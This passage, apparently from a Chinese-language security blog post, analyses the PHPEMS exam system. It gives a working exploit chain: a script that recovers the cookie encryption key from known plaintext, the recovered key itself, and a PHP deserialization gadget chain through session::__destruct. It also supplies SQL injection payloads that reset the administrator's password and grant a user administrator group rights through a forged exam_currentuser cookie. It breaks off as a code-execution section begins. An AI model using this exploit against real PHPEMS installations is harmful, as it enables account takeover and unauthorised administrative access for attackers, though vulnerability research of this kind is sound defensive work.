language_">$this</span>-&gt;sessionid,<span class="string">&#x27;sessionuserid&#x27;</span>=&gt;<span class="variable">$args</span>[<span class="string">&#x27;sessionuserid&#x27;</span>],<span class="string">&#x27;sessionpassword&#x27;</span>=&gt;<span class="variable">$args</span>[<span class="string">&#x27;sessionpassword&#x27;</span>],<span class="string">&#x27;sessionip&#x27;</span>=&gt;<span class="variable">$args</span>[<span class="string">&#x27;sessionip&#x27;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ev-&gt;<span class="title function_ invoke__">setCookie</span>(<span class="variable">$this</span>-&gt;sessionname,<span class="variable">$this</span>-&gt;strings-&gt;<span class="title function_ invoke__">encode</span>(<span class="variable">$args</span>),<span class="number">3600</span>*<span class="number">24</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后在<code>setCookie()</code>进行最终的操作，将加密后的值赋值给cookie里的<code>exam_currentuser</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span>,<span class="variable">$time</span>=<span class="number">3600</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$time</span>)<span class="variable">$time</span> = TIME + <span class="variable">$time</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="variable">$time</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(CDO)<span class="title function_ invoke__">setCookie</span>(CH.<span class="variable">$name</span>,<span class="variable">$value</span>,<span class="variable">$time</span>,CP,CDO,<span class="literal">false</span>,<span class="literal">TRUE</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="title function_ invoke__">setCookie</span>(CH.<span class="variable">$name</span>,<span class="variable">$value</span>,<span class="variable">$time</span>,CP,<span class="string">&#x27;&#x27;</span>,<span class="literal">false</span>,<span class="literal">TRUE</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022143734.png" title="image-20240202214306583" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022143734.png" alt="image-20240202214306583"></a></p>
+<p>当我们设置<code>Client-IP: 127.0.0.1</code>header的时候，就可以看到<code>sessionip</code>的值为<code>127.0.0.1</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022145041.png" title="image-20240202214547950" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022145041.png" alt="image-20240202214547950"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022144488.png" title="image-20240202214416346" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022144488.png" alt="image-20240202214416346"></a></p>
+<p>这里就是我们可以控制的密文部分了，其明文的为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:9:&quot;sessionid&quot;;s:32:&quot;f5316b94fc79a4a0a1095f1b6b105e7d&quot;;s:9:&quot;sessionip&quot;;s:9:&quot;127.0.0.1&quot;;s:16:&quot;sessiontimelimit&quot;;i:1706881593;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>总共131个字符，其密文也应该是131个字符</p>
+<p>为了获取到32位的key，我们需要让我们可以控制、预测的密文长度至少为32。</p>
+<p>在这里可以取的范围为<code>&quot;;s:9:&quot;sessionip&quot;;s:9:&quot;127.0.0.1&quot;;s:16:&quot;sessiontimelimit&quot;;i:</code>，这里的长度是60</p>
+<p>最后为了获取完整的key，要么是找到可以整除32的起点，要么是找到重复字符串，自己去首尾拼接。我这里为了方便，选择第一种方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">substr</span>($明文,<span class="number">64</span>,<span class="number">32</span>)</span><br><span class="line"><span class="comment">//:&quot;sessionip&quot;;s:9:&quot;127.0.0.1&quot;;s:</span></span><br></pre></td></tr></table></figure>
+
+<p>先带header，不带cookie去访问目标网站获取密文</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022200598.png" title="image-20240202220008509" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022200598.png" alt="image-20240202220008509"></a></p>
+<p>然后利用密文和我们调式出来的明文获取key</p>
+<p>解密脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$enc</span>=<span class="string">&quot;%2595%259Cfs%25AF%25D9lon%2586%25D9%25C8%25D7%25D6%25A0%25A1%25A2%25CA%2594X%259D%25AC%259Ccg%259DS%2598np%2595%25C5m%2595k%259C%2596%25C8g%259Bf%25C9%259D%2593%25C6%2597jb%2597%2591%2560j%25C4o%25C5dh%2594a%2587p%25AC%259F%259Dn%2584%25A6%259E%25A7%25D9%259B%25A5%25A2%25CD%25D6%2585%259F%25D6qkn%2583ah%2599g%2592%255Ee%2591b%2587p%25AC%259F%2595j%259CU%25AC%2599%25D9%25A5%259F%25A3%25D2%25DA%25CC%25D1%25C8%25A3%259B%25A1%25CA%25A4X%259D%25A2%259Cal%2593g%259Dmk%2599%2594f%259D%25B0&quot;</span>;</span><br><span class="line"><span class="variable">$enc_r</span>=<span class="title function_ invoke__">urldecode</span>(<span class="variable">$enc</span>);</span><br><span class="line"><span class="variable">$enc_r</span>=<span class="title function_ invoke__">urldecode</span>(<span class="variable">$enc_r</span>);</span><br><span class="line"><span class="variable">$enc_r</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$enc_r</span>,<span class="number">64</span>,<span class="number">32</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getkey</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$info</span>=<span class="variable">$a</span>;</span><br><span class="line">    <span class="variable">$kl</span> = <span class="number">32</span>;</span><br><span class="line">    <span class="variable">$il</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$il</span>; <span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable">$i</span>%<span class="variable">$kl</span>;</span><br><span class="line">        <span class="variable">$key</span>.= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$info</span>[<span class="variable">$i</span>])-<span class="title function_ invoke__">ord</span>(<span class="variable">$b</span>[<span class="variable">$p</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">getkey</span>(<span class="variable">$enc_r</span>,<span class="string">&#x27;:&quot;sessionip&quot;;s:9:&quot;127.0.0.1&quot;;s:1&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>得到key为<code>4b394f264dfcdc724a06b9b05c1e59ed</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022201239.png" title="image-20240202220133099" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022201239.png" alt="image-20240202220133099"></a></p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>反序列化能打的点只有一个，因为这套源码没有使用自动类加载</p>
+<p>就是<code>session</code>类的<code>__destruct()</code>函数，通过更改<code>pdosql</code>对象的属性，进行sql注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session::__destruct()-&gt;pdosql::makeUpdate()-&gt;pepdo::exec()</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022204419.png" title="image-20240202220435313" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022204419.png" alt="image-20240202220435313"></a></p>
+<p>具体更改的地方就是<code>pdosql</code>对象的<code>tablepre</code>属性</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//生成update sql</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeUpdate</span>(<span class="params"><span class="variable">$args</span>,<span class="variable">$tablepre</span> = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$args</span>))<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$tablepre</span> === <span class="literal">NULL</span>)<span class="variable">$tb_pre</span> = <span class="variable language_">$this</span>-&gt;tablepre;</span><br><span class="line">    <span class="keyword">else</span> <span class="variable">$tb_pre</span> = <span class="variable">$tablepre</span>;</span><br><span class="line">    <span class="variable">$tables</span> = <span class="variable">$args</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$args</span>[<span class="number">1</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_makeDefaultUpdateArgs</span>(<span class="variable">$tables</span>,<span class="variable">$args</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$tables</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$db_tables</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$tables</span> <span class="keyword">as</span> <span class="variable">$p</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$db_tables</span>[] = <span class="string">&quot;<span class="subst">&#123;$tb_pre&#125;</span><span class="subst">&#123;$p&#125;</span> AS <span class="subst">$p</span>&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$db_tables</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$db_tables</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="variable">$db_tables</span> = <span class="variable">$tb_pre</span>.<span class="variable">$tables</span>;</span><br><span class="line">    <span class="variable">$v</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pars</span> = <span class="variable">$args</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$pars</span>))<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$parsql</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$pars</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$parsql</span>[] = <span class="variable">$key</span>.<span class="string">&#x27; = &#x27;</span>.<span class="string">&#x27;:&#x27;</span>.<span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>))<span class="variable">$value</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="variable">$v</span>[<span class="variable">$key</span>] = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$parsql</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$parsql</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span> = <span class="variable">$args</span>[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$query</span>))<span class="variable">$db_query</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$q</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$p</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$q</span>[] = <span class="variable">$p</span>[<span class="number">0</span>].<span class="string">&#x27; &#x27;</span>.<span class="variable">$p</span>[<span class="number">1</span>].<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$p</span>[<span class="number">2</span>]))</span><br><span class="line">                <span class="variable">$v</span>[<span class="variable">$p</span>[<span class="number">2</span>]] = <span class="variable">$p</span>[<span class="number">3</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$db_query</span> = <span class="string">&#x27;1 &#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27; &#x27;</span>,<span class="variable">$q</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$args</span>[<span class="number">3</span>]))</span><br><span class="line">        <span class="variable">$db_groups</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$args</span>[<span class="number">3</span>])?<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$args</span>[<span class="number">3</span>]):<span class="variable">$args</span>[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="variable">$db_groups</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$args</span>[<span class="number">4</span>]))</span><br><span class="line">        <span class="variable">$db_orders</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$args</span>[<span class="number">4</span>])?<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$args</span>[<span class="number">4</span>]):<span class="variable">$args</span>[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="variable">$db_orders</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$args</span>[<span class="number">5</span>]))</span><br><span class="line">        <span class="variable">$db_limits</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$args</span>[<span class="number">5</span>])?<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$args</span>[<span class="number">5</span>]):<span class="variable">$args</span>[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="variable">$db_limits</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$db_limits</span> == <span class="literal">false</span> &amp;&amp; <span class="variable">$db_limits</span> !== <span class="literal">false</span>)<span class="variable">$db_limits</span> = <span class="variable language_">$this</span>-&gt;_mostlimits;</span><br><span class="line">    <span class="variable">$db_groups</span> = <span class="variable">$db_groups</span>?<span class="string">&#x27; GROUP BY &#x27;</span>.<span class="variable">$db_groups</span>:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$db_orders</span> = <span class="variable">$db_orders</span>?<span class="string">&#x27; ORDER BY &#x27;</span>.<span class="variable">$db_orders</span>:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&#x27;UPDATE &#x27;</span>.<span class="variable">$db_tables</span>.<span class="string">&#x27; SET &#x27;</span>.<span class="variable">$parsql</span>.<span class="string">&#x27; WHERE &#x27;</span>.<span class="variable">$db_query</span>.<span class="variable">$db_groups</span>.<span class="variable">$db_orders</span>.<span class="string">&#x27; LIMIT &#x27;</span>.<span class="variable">$db_limits</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;sql&#x27;</span> =&gt; <span class="variable">$sql</span>, <span class="string">&#x27;v&#x27;</span> =&gt; <span class="variable">$v</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>取<code>$this-&gt;tablepre</code>的值，然后拼接为<code>$db_tables</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022210687.png" title="image-20240202221040641" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022210687.png" alt="image-20240202221040641"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022209373.png" title="image-20240202220937285" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022209373.png" alt="image-20240202220937285"></a></p>
+<p>最后拼接为sql语句</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022212027.png" title="image-20240202221228984" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022212027.png" alt="image-20240202221228984"></a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> x2_session <span class="keyword">SET</span> sessionlasttime <span class="operator">=</span> :sessionlasttime <span class="keyword">WHERE</span> <span class="number">1</span> <span class="keyword">AND</span> sessionid <span class="operator">=</span> :sessionid  LIMIT <span class="number">512</span></span><br></pre></td></tr></table></figure>
+
+<p>这里面的<code>x2_</code>是可控的，所以我们可以构造sql语句来修改管理员密码或者修改用户的权限，然后利用<code>#</code>或者<code>+ --qwe</code>来注释后面的sql语句</p>
+<p>通过查看注册代码，可以知道这里的密码是经过md5加密</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022214617.png" title="image-20240202221445574" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022214617.png" alt="image-20240202221445574"></a></p>
+<p>所以设置<code>$this-&gt;tablepre</code>的值为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x2_user SET userpassword = &#x27;e10adc3949ba59abbe56e057f20f883e&#x27; WHERE userid = 1  #</span><br></pre></td></tr></table></figure>
+
+<p>最后得到拼接的sql语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> x2_user <span class="keyword">SET</span> userpassword <span class="operator">=</span> <span class="string">&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;</span> <span class="keyword">WHERE</span> userid <span class="operator">=</span> <span class="number">1</span>  #session <span class="keyword">SET</span>  <span class="keyword">WHERE</span> <span class="number">1</span> <span class="keyword">AND</span> sessionid <span class="operator">=</span> :sessionid  LIMIT <span class="number">512</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022216453.png" title="image-20240202221639407" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022216453.png" alt="image-20240202221639407"></a></p>
+<p>进入到后面的<code>exec()</code>里，因为预编译的值都被注释了，所以不会影响sql语句的执行</p>
+<p>执行成功</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022218657.png" title="image-20240202221816614" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022218657.png" alt="image-20240202221816614"></a></p>
+<p>看表里也被修改了</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022218439.png" title="image-20240202221844373" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022218439.png" alt="image-20240202221844373"></a></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在构造序列化的时候，需要注意添加到一个数组里，否则在执行到这里的时候，会报错，导致无法进入<code>__destruct()</code>方法里</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022221783.png" title="image-20240202222121705" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022221783.png" alt="image-20240202222121705"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022221035.png" title="image-20240202222131934" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022221035.png" alt="image-20240202222131934"></a></p>
+<p>同时还要注意php版本，php5和php7反序列化时对访问控制修饰符的敏感性不一样，所以pop链最好做成以php5版本的，这样php7才通用，我之前就犯了这个错误，导致php5环境用不了，导致报错</p>
+<p>通过修改用户权限的方式</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">PHPEMS</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">pdosql</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">db</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$tablepre</span> = <span class="string">&quot;x2_user SET usergroupid = 1 WHERE username = &#x27;v2ish1yan&#x27;  #&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;db=<span class="keyword">new</span> <span class="title function_ invoke__">pepdo</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">pepdo</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">session</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pdosql=<span class="keyword">new</span> \PHPEMS\<span class="title function_ invoke__">pdosql</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;db=<span class="keyword">new</span> \PHPEMS\<span class="title function_ invoke__">pepdo</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">function</span> <span class="title class_">encode</span>($<span class="title class_">info</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $<span class="title class_">info</span> = <span class="title class_">serialize</span>($<span class="title class_">info</span>);</span><br><span class="line">        <span class="variable">$key</span> = <span class="string">&quot;4b394f264dfcdc724a06b9b05c1e59ed&quot;</span>;</span><br><span class="line">        <span class="variable">$kl</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line">        <span class="variable">$il</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$info</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$il</span>; <span class="variable">$i</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$p</span> = <span class="variable">$i</span>%<span class="variable">$kl</span>;</span><br><span class="line">            <span class="variable">$info</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$info</span>[<span class="variable">$i</span>])+<span class="title function_ invoke__">ord</span>(<span class="variable">$key</span>[<span class="variable">$p</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$info</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> \PHPEMS\<span class="title function_ invoke__">session</span>();</span><br><span class="line">    <span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;sessionid&quot;</span>=&gt;<span class="string">&quot;213&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">encode</span>(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将得到的值设置为<code>exam_currentuser</code>，带着这个cookie访问网站</p>
+<p>成功修改权限，登录后台</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022232625.png" title="image-20240202223224547" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022232625.png" alt="image-20240202223224547"></a></p>
+<h1 id="RCE（代码执行）"><a href="#RCE（代码执行）" class="headerlink" title="RCE（代码执行）"></a>RCE（代码执行）</h1><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>代码执行首先找关键函数</p>
+<p>只有一个文件里有执行<code>eval()</code>函数</p>
